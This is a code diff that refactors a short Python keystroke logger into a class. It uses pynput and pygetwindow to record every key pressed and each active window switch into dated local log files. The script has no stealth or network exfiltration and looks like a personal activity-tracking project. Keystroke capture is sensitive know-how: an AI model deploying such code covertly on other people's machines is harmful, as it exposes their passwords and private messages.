@@ -2,25 +2,26 @@ from pynput import keyboard
 from time import gmtime, strftime
 import pygetwindow as gw
 
-last_window= None
-def save_to_file(data):
-    with open(f"logs/{strftime("%Y-%m-%d", gmtime())}.txt", "a", encoding= "utf-8") as file:
-        file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')
+class Activity_tracker:
+    def __init__(self):
+        self.last_window= None
 
-    
-def on_press(key):
-    global last_window
-    active_window= gw.getActiveWindowTitle()
-    if active_window != last_window:
-        save_to_file(f"Switched to: {active_window}")
-        print(f"Switched to: {active_window}")
-        last_window= active_window
-    print(f"Typed: {key}")
-    save_to_file(f"Typed: {key}")
+    def __save_to_file(self, data):
+        with open(f"logs/{strftime("%Y-%m-%d", gmtime())}.txt", "a", encoding= "utf-8") as file:
+            file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')
+
+    def on_press(self, key):
+        active_window= gw.getActiveWindowTitle()
+        if active_window != self.last_window:
+            self.__save_to_file(f"Switched to: {active_window}")
+            print(f"Switched to: {active_window}")
+            self.last_window= active_window
+        print(f"Typed: {key}")
+        self.__save_to_file(f"Typed: {key}")
 
 
-
+tracker= Activity_tracker()
 with keyboard.Listener(
-    on_press= on_press
+    on_press= tracker.on_press
 ) as listener:
     listener.join()
